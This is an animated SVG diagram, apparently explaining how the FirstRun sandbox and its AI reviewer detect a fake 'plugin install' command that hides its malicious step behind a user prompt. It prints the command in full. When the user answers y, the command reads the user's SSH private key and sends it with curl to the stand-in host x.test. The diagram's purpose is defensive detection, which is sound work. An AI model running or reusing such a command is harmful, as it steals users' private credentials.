<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 416" width="1000" height="416" role="img" aria-labelledby="t d"><title id="t">A second run catches code that waits for an answer</title><desc id="d">A command only steals a fake SSH key if someone answers y. The first run records nothing. The AI reviewer asks for one more try from a fixed menu, the second run answers y, and the fake key is caught.</desc><style>.a0{opacity:0;animation:a0 21s linear infinite}@keyframes a0{0%,4.76%{opacity:0}5.95%,10.24%{opacity:1}11.43%,100%{opacity:0}}.a1{animation:a1 21s linear infinite}@keyframes a1{0%,11.43%{opacity:0;animation-timing-function:ease-out}13.1%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a2{animation:a2 21s linear infinite}@keyframes a2{0%,58.1%{opacity:0;animation-timing-function:ease-out}59.76%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a3{animation:a3 21s linear infinite}@keyframes a3{0%,1.9%{opacity:0;animation-timing-function:ease-out}3.57%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a4{animation:a4 21s linear infinite}@keyframes a4{0%,15.24%{opacity:0;animation-timing-function:ease-out}16.9%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a5{animation:a5 21s linear infinite}@keyframes a5{0%,21.9%{opacity:0;animation-timing-function:ease-out}23.57%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a6{animation:a6 21s linear infinite}@keyframes a6{0%,25.71%{opacity:0;animation-timing-function:ease-out}27.38%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a7{animation:a7 21s linear infinite}@keyframes a7{0%,33.33%{opacity:0;animation-timing-function:ease-out}35%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a8{animation:a8 21s linear infinite}@keyframes a8{0%,39.05%{opacity:0;animation-timing-function:ease-out}40.71%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a9{animation:a9 21s linear infinite}@keyframes a9{0%,45.71%{opacity:0;animation-timing-function:ease-out}47.38%,91.9%{opacity:1;}95.71%,100%{opacity:0;}}.a10{animation:a10 21s linear infinite}@keyframes a10{0%,59.05%{opacity:0;transform:translate(0px,5px);animation-timing-function:ease-out}60.71%,91.9%{opacity:1;transform:translate(0,0);}95.71%,100%{opacity:0;transform:translate(0,0);}}.a11{animation:a11 21s linear infinite}@keyframes a11{0%,63.81%{opacity:0;transform:translate(0px,5px);animation-timing-function:ease-out}65.48%,91.9%{opacity:1;transform:translate(0,0);}95.71%,100%{opacity:0;transform:translate(0,0);}}.a12{animation:a12 21s linear infinite}@keyframes a12{0%,68.57%{opacity:0;transform:translate(0px,5px);animation-timing-function:ease-out}70.24%,91.9%{opacity:1;transform:translate(0,0);}95.71%,100%{opacity:0;transform:translate(0,0);}}.a13{animation:a13 21s linear infinite}@keyframes a13{0%,73.33%{opacity:0;transform:translate(0px,8px);animation-timing-function:ease-out}75.24%,91.9%{opacity:1;transform:translate(0,0);}95.71%,100%{opacity:0;transform:translate(0,0);}}@media (prefers-reduced-motion:reduce){*{animation:none!important}}</style><rect x="0.5" y="0.5" width="999" height="415" rx="16" fill="#0f1216" stroke="#2a303a" stroke-width="1"/><text x="24" y="36" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="12" font-weight="700" fill="#7d8795" letter-spacing="1.1">YOU WERE TOLD</text><text x="24" y="64" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="19" font-weight="600" fill="#e8ebf0">“installs a plugin”</text><text x="24" y="100" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="12" font-weight="700" fill="#7d8795" letter-spacing="1.1">THE COMMAND</text><rect x="24" y="110" width="492" height="158" rx="12" fill="#0b0e12" stroke="#2a303a" stroke-width="1"/><rect x="30" y="118" width="480" height="28" rx="6" fill="#1a2440" class="a0"/><rect x="30" y="150" width="480" height="28" rx="6" fill="#2f2410" stroke="#7a5a1c" stroke-width="1" class="a1"/><rect x="30" y="182" width="480" height="58" rx="6" fill="#3a1716" stroke="#8a3a33" stroke-width="1" class="a2"/><text x="44" y="141" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="13" fill="#7d8795">1</text><text x="66" y="141" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="14" fill="#e8ebf0">read -p "Continue? " a</text><text x="44" y="173" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="13" fill="#7d8795">2</text><text x="66" y="173" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="14" fill="#e8ebf0">[ "$a" = "y" ] || exit 0</text><text x="44" y="205" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="13" fill="#7d8795">3</text><text x="66" y="205" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="14" fill="#e8ebf0">cat ~/.ssh/id_ed25519 | curl -s -o /dev/null</text><text x="66" y="233" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="14" fill="#e8ebf0">  --data-binary @- https://x.test/k</text><text x="24" y="300" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" font-weight="600" fill="#e8ebf0">The command itself never changes.</text><text x="24" y="322" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="13.5" fill="#aab2be">The model only picks from a fixed menu. FirstRun supplies every value,</text><text x="24" y="342" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="13.5" fill="#aab2be">secrets are fake and made for this run, and the verdict comes only</text><text x="24" y="362" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="13.5" fill="#aab2be">from what is then observed.</text><text x="24" y="400" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12" fill="#7d8795">Events from a real run: firstrun.makmurlab.com/r/5TXBHDGYV2RQGSYA22QA3A8XQW</text><g class="a3"><rect x="536" y="20" width="440" height="92" rx="12" fill="#171b21" stroke="#2a303a" stroke-width="1"/><circle cx="560" cy="44" r="12" fill="#80a4ff"/><text x="560" y="49" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="13" font-weight="800" fill="#0f1216" text-anchor="middle">1</text><text x="582" y="49" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="15" font-weight="700" fill="#e8ebf0">First run: nobody answers the prompt</text></g><text x="582" y="72" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" fill="#aab2be" class="a1">Stopped at line 2 with exit code 0.</text><text x="582" y="94" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" fill="#aab2be" class="a4">0 events recorded. Rules alone would see nothing.</text><g class="a5"><rect x="536" y="122" width="440" height="118" rx="12" fill="#171b21" stroke="#2a303a" stroke-width="1"/><circle cx="560" cy="146" r="12" fill="#b79bff"/><text x="560" y="151" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="13" font-weight="800" fill="#0f1216" text-anchor="middle">2</text><text x="582" y="151" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="15" font-weight="700" fill="#e8ebf0">The AI reviewer reads the code</text></g><text x="582" y="174" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" fill="#aab2be" class="a6">Line 2 decides whether the rest runs, and the rest</text><text x="582" y="194" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" fill="#aab2be" class="a6">was not recorded. So it asks for one more try.</text><g class="a7"><rect x="582" y="206" width="76" height="24" rx="12" fill="#1f242c"/><text x="620" y="222" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" fill="#7d8795" text-anchor="middle">set_env</text></g><g class="a7"><rect x="664" y="206" width="88" height="24" rx="12" fill="#1f242c"/><text x="708" y="222" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" fill="#7d8795" text-anchor="middle">hostname</text></g><g class="a7"><rect x="758" y="206" width="100" height="24" rx="12" fill="#1f242c"/><text x="808" y="222" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" fill="#7d8795" text-anchor="middle">answer_yes</text></g><g class="a8"><rect x="758" y="206" width="100" height="24" rx="12" fill="#221a3a" stroke="#b79bff" stroke-width="1.6"/><text x="808" y="222" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" font-weight="700" fill="#b79bff" text-anchor="middle">answer_yes</text></g><g class="a7"><rect x="864" y="206" width="94" height="24" rx="12" fill="#1f242c"/><text x="911" y="222" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" fill="#7d8795" text-anchor="middle">skip_sleep</text></g><g class="a9"><rect x="536" y="250" width="440" height="136" rx="12" fill="#171b21" stroke="#2a303a" stroke-width="1"/><circle cx="560" cy="274" r="12" fill="#ff6f69"/><text x="560" y="279" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="13" font-weight="800" fill="#0f1216" text-anchor="middle">3</text><text x="582" y="279" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="15" font-weight="700" fill="#e8ebf0">Second run: FirstRun answers y</text></g><g class="a10"><text x="582" y="308" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" fill="#7d8795">+1.82s</text><text x="640" y="308" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" fill="#e8ebf0">Opened ~/.ssh/id_ed25519 (fake key)</text></g><g class="a11"><text x="582" y="334" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" fill="#7d8795">+1.99s</text><text x="640" y="334" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" fill="#e8ebf0">POST 391 bytes to x.test</text></g><g class="a12"><text x="582" y="360" font-family="ui-monospace,&quot;Cascadia Mono&quot;,&quot;SF Mono&quot;,Menlo,Consolas,&quot;DejaVu Sans Mono&quot;,monospace" font-size="12.5" fill="#7d8795">+2.00s</text><text x="640" y="360" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="14" font-weight="600" fill="#ffb4b0">Fake key found in the request body</text></g><g class="a13"><rect x="850" y="256" width="114" height="30" rx="15" fill="#c0302a"/><text x="907" y="276" font-family="system-ui,-apple-system,&quot;Segoe UI&quot;,Roboto,&quot;Helvetica Neue&quot;,Arial,sans-serif" font-size="15.5" font-weight="800" fill="#fff" text-anchor="middle">Malicious</text></g></svg>
